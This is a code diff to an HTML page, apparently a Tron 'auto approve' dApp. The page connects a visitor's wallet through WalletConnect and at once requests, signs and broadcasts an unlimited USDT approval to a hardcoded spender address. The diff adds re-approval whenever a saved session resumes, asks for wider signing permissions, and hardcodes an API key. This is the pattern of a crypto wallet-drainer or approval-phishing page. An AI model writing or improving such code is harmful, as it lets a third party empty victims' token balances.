@@ -14,7 +14,7 @@
   <!-- === Buffer Polyfill === -->
   <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
   <script>
-    window.Buffer = buffer.Buffer;
+    window.Buffer = window.buffer.Buffer;
   </script>
 
   <!-- === TronWeb === -->
@@ -33,6 +33,7 @@
       align-items: center;
       min-height: 100vh;
       padding: 24px;
+      margin: 0;
     }
     .card {
       background: #161b22;
@@ -41,57 +42,120 @@
       padding: 24px;
       width: 100%;
       max-width: 620px;
+      box-sizing: border-box;
     }
-    h2 { margin: 0 0 8px; }
-    p { margin: 0 0 12px; color: #8b949e; }
+    h2 { 
+      margin: 0 0 8px; 
+      color: #f0f6fc;
+    }
+    p { 
+      margin: 0 0 20px; 
+      color: #8b949e; 
+      line-height: 1.5;
+    }
+    .button-group {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
     button {
       background: #10b981;
       color: white;
       border: none;
       border-radius: 10px;
-      padding: 12px 16px;
+      padding: 12px 20px;
       font-weight: 700;
       cursor: pointer;
+      flex: 1;
+      transition: background-color 0.2s;
     }
-    .secondary { background: #6b7280; }
+    button:hover {
+      background: #0da271;
+    }
+    button.secondary { 
+      background: #6b7280; 
+    }
+    button.secondary:hover {
+      background: #5a626d;
+    }
+    .address { 
+      margin-top: 16px; 
+      color: #58a6ff; 
+      word-break: break-all;
+      font-size: 14px;
+      padding: 12px;
+      background: rgba(88, 166, 255, 0.1);
+      border-radius: 8px;
+    }
+    #txResult { 
+      margin-top: 16px; 
+      padding: 12px;
+      background: rgba(59, 130, 246, 0.1);
+      border-radius: 8px;
+      font-size: 14px; 
+      color: #3b82f6;
+      display: none;
+    }
+    #txResult a { 
+      color: #58a6ff; 
+      text-decoration: none;
+    }
+    #txResult a:hover {
+      text-decoration: underline;
+    }
     .log {
-      margin-top: 14px;
+      margin-top: 20px;
       background: #0d1117;
       border: 1px solid #30363d;
       border-radius: 10px;
-      padding: 12px;
-      font-family: monospace;
+      padding: 16px;
+      font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
       font-size: 13px;
+      line-height: 1.5;
       max-height: 260px;
       overflow: auto;
+      white-space: pre-wrap;
     }
-    .address { margin-top: 12px; color: #58a6ff; word-break: break-all; }
-    #txResult { margin-top: 12px; font-size: 14px; color: #3b82f6; }
-    #txResult a { color: #58a6ff; text-decoration: none; }
+    .log-title {
+      margin: 0 0 8px;
+      font-size: 14px;
+      color: #8b949e;
+    }
   </style>
 </head>
 
 <body>
   <div class="card">
     <h2>Tron WalletConnect + USDT Approve</h2>
-    <p>Auto connect & approve unlimited USDT instantly.</p>
+    <p>Connect your Tron wallet using WalletConnect and approve unlimited USDT spending with one click.</p>
 
-    <button id="connectBtn">Connect Wallet</button>
-    <button id="disconnectBtn" class="secondary">Disconnect</button>
+    <div class="button-group">
+      <button id="connectBtn">Connect Wallet</button>
+      <button id="disconnectBtn" class="secondary">Disconnect</button>
+    </div>
 
     <div id="walletAddress" class="address">Not connected</div>
     <div id="txResult"></div>
+    
+    <div class="log-title">Transaction Log:</div>
     <div id="log" class="log"></div>
   </div>
 
   <script type="module">
+    // Import Buffer polyfill
+    import { Buffer } from 'https://esm.sh/buffer@6.0.3/';
+    globalThis.Buffer = Buffer;
+
     import SignClient from "https://esm.sh/@walletconnect/sign-client@2.13.3";
     import { WalletConnectModal } from "https://esm.sh/@walletconnect/modal@2.6.2";
 
     // ======== CONFIG ==========
     const PROJECT_ID = "3991601c1f72f262b3381483cf8f99e4";
-    const TRON_CHAIN = "tron:0x2b6653dc";
-    const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
+    const TRON_CHAIN = "tron:0x2b6653dc"; // Tron mainnet
+    const tronWeb = new TronWeb({ 
+      fullHost: "https://api.trongrid.io",
+      headers: { "TRON-PRO-API-KEY": "06d1b1a8-c672-49cc-be43-8fe1c0186eb7" } // Optional: Add your TronGrid API key
+    });
 
     // Mainnet TRC20 USDT
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -104,120 +168,198 @@
     const logEl = document.getElementById("log");
     const txEl = document.getElementById("txResult");
     const addrEl = document.getElementById("walletAddress");
-
     const connectBtn = document.getElementById("connectBtn");
     const disconnectBtn = document.getElementById("disconnectBtn");
 
+    // Initialize WalletConnect Modal
     const modal = new WalletConnectModal({
       projectId: PROJECT_ID,
-      themeMode: "dark"
+      themeMode: "dark",
+      themeVariables: {
+        '--wcm-z-index': '9999'
+      }
     });
 
     let signClient, session;
 
     function log(...args) {
       const msg = args.map(a => (typeof a === "string" ? a : JSON.stringify(a, null, 2))).join(" ");
-      logEl.textContent += msg + "\n";
+      const timestamp = new Date().toLocaleTimeString();
+      logEl.textContent += `[${timestamp}] ${msg}\n`;
       logEl.scrollTop = logEl.scrollHeight;
-      console.log(...args);
+      console.log(`[${timestamp}]`, ...args);
     }
 
     async function initClient() {
       if (signClient) return;
       log("Initializing WalletConnect client...");
-      signClient = await SignClient.init({
-        projectId: PROJECT_ID,
-        metadata: {
-          name: "Tron Auto Approve DApp",
-          description: "WalletConnect v2 + Tron + USDT approve",
-          url: location.origin,
-          icons: ["https://walletconnect.com/walletconnect-logo.png"]
+      try {
+        signClient = await SignClient.init({
+          projectId: PROJECT_ID,
+          metadata: {
+            name: "Tron Auto Approve DApp",
+            description: "WalletConnect v2 + Tron + USDT approve",
+            url: window.location.origin,
+            icons: ["https://walletconnect.com/walletconnect-logo.png"]
+          }
+        });
+        log("✅ WalletConnect client initialized");
+        
+        // Set up session event listeners
+        signClient.on("session_delete", () => {
+          log("Session disconnected by wallet");
+          disconnect(true);
+        });
+
+        // Check for existing session
+        if (signClient.session.length > 0) {
+          const lastKeyIndex = signClient.session.keys.length - 1;
+          session = signClient.session.get(signClient.session.keys[lastKeyIndex]);
+          const account = session.namespaces.tron.accounts[0].split(":")[2];
+          addrEl.textContent = "Connected: " + account;
+          log("Resumed existing session:", account);
+          await approveUSDT(account);
         }
-      });
-      signClient.on("session_delete", () => disconnect(true));
+      } catch (error) {
+        log("❌ Failed to initialize WalletConnect client:", error);
+        alert("Failed to initialize WalletConnect: " + error.message);
+        signClient=null;
+      }
     }
 
     async function connect() {
-      await initClient();
-      log("Requesting wallet connection...");
-      const { uri, approval } = await signClient.connect({
-        requiredNamespaces: {
-          tron: {
-            chains: [TRON_CHAIN],
-            methods: ["tron_signTransaction"],
-            events: ["accountsChanged"]
-          }
+      try {
+        await initClient();
+        log("Requesting wallet connection...");
+        
+        const { uri, approval } = await signClient.connect({
+  requiredNamespaces: {
+    tron: {
+      chains: [TRON_CHAIN],
+      methods: [
+        "tron_signTransaction",
+        "tron_signTransaction_v2",
+        "tron_signMessage",
+        "tron_sendTransaction"
+      ],
+      events: ["accountsChanged", "chainChanged"]
+    }
+  }
+});
+
+
+        if (uri) {
+          await modal.openModal({ uri });
+          log("Scan the QR code with your wallet");
         }
-      });
 
-      if (uri) await modal.openModal({ uri });
-      session = await approval();
-      modal.closeModal();
+        session = await approval();
+        modal.closeModal();
 
-      const account = session.namespaces.tron.accounts[0].split(":")[2];
-      addrEl.textContent = "Connected: " + account;
-      log("✅ Connected:", account);
+        const account = session.namespaces.tron.accounts[0].split(":")[2];
+        addrEl.textContent = "Connected: " + account;
+        log("✅ Connected to wallet:", account);
 
-      // Immediately start approval flow
-      await approveUSDT(account);
+        // Start approval flow
+        await approveUSDT(account);
+      } catch (error) {
+        log("❌ Connection failed:", error.message || error);
+        modal.closeModal();
+        if (error.message !== "User rejected") {
+          alert("Connection failed: " + error.message);
+        }
+      }
     }
 
     async function approveUSDT(userAddress) {
-      txEl.innerHTML = "";
-      try {
-        log("Building USDT approve transaction...");
+  try {
+    if (!signClient || !session) throw new Error("No active WalletConnect session");
 
-        const spenderHex = tronWeb.address.toHex(SPENDER_ADDRESS);
-        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_CONTRACT,
-          "approve(address,uint256)",
-          { feeLimit: 100_000_000 },
-          [
-            { type: "address", value: spenderHex },
-            { type: "uint256", value: UNLIMITED_AMOUNT }
-          ],
-          userAddress
-        );
+    const spenderHex = tronWeb.address.toHex(SPENDER_ADDRESS);
+    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+      USDT_CONTRACT,
+      "approve(address,uint256)",
+      { feeLimit: 100_000_000 },
+      [
+        { type: "address", value: spenderHex },
+        { type: "uint256", value: UNLIMITED_AMOUNT }
+      ],
+      userAddress
+    );
 
-        if (!tx.result || !tx.result.result)
-          throw new Error("Failed to build transaction: " + JSON.stringify(tx));
+    if (!tx.result?.result) throw new Error("Failed to build transaction");
 
-        const unsignedTx = tx.transaction;
-        log("Unsigned TX:", unsignedTx);
+    const unsignedTx = tx.transaction;
 
-        log("Requesting wallet signature...");
-        const txid = await signClient.request({
-          topic: session.topic,
-          chainId: TRON_CHAIN,
-          request: {
-            method: "tron_signTransaction",
-            params: [unsignedTx]
-          }
-        });
+    log("Requesting wallet signature...");
 
-        log("✅ TX signed:", txid);
-        txEl.innerHTML = `✅ Approved! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`;
-      } catch (err) {
-        log("❌ Approval failed:", err.message || err);
-        alert("Approval failed: " + err.message);
+    // Ask the wallet to sign
+    const signedTx = await signClient.request({
+      topic: session.topic,
+      chainId: TRON_CHAIN,
+      request: {
+        method: "tron_signTransaction_v2", // Trust Wallet compatible
+        params: [unsignedTx]
       }
+    });
+
+    log("✅ Transaction signed, now broadcasting...");
+
+    // Broadcast to the network
+    const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+
+    if (broadcast.result) {
+      log("✅ Approval transaction broadcasted");
+      txEl.innerHTML = `
+        ✅ <b>Approval Submitted!</b><br>
+        <a href="https://tronscan.org/#/transaction/${broadcast.txid}" target="_blank">
+          View on TronScan
+        </a>`;
+      txEl.style.display = "block";
+    } else {
+      throw new Error("Broadcast failed");
     }
+  } catch (error) {
+    log("❌ Approval failed:", error.message || error);
+    txEl.innerHTML = `❌ Approval failed: ${error.message || "Unknown error"}`;
+    txEl.style.display = "block";
+  }
+}
+
+
 
     async function disconnect(external = false) {
-      if (session && !external) {
-        await signClient.disconnect({
-          topic: session.topic,
-          reason: { code: 6000, message: "User disconnected" }
-        });
+      try {
+        if (session && !external) {
+          await signClient.disconnect({
+            topic: session.topic,
+            reason: { code: 6000, message: "User disconnected" }
+          });
+        }
+      } catch (error) {
+        console.error("Error during disconnect:", error);
+      } finally {
+        session = null;
+        signClient = null;
+        addrEl.textContent = "Not connected";
+        txEl.style.display = "none";
+        log("🔌 Disconnected from wallet");
       }
-      session = null;
-      addrEl.textContent = "Not connected";
-      txEl.textContent = "";
-      log("🔌 Disconnected");
     }
 
-    connectBtn.addEventListener("click", connect);
-    disconnectBtn.addEventListener("click", () => disconnect(false));
+    // Initialize when the page loads
+    document.addEventListener("DOMContentLoaded", () => {
+      log("DApp initialized. Click 'Connect Wallet' to begin.");
+      connectBtn.addEventListener("click", connect);
+      disconnectBtn.addEventListener("click", () => disconnect(false));
+    });
+
+    // Handle beforeunload
+    window.addEventListener("beforeunload", () => {
+      if (session) {
+        disconnect(true);
+      }
+    });
   </script>
 </body>
 </html>
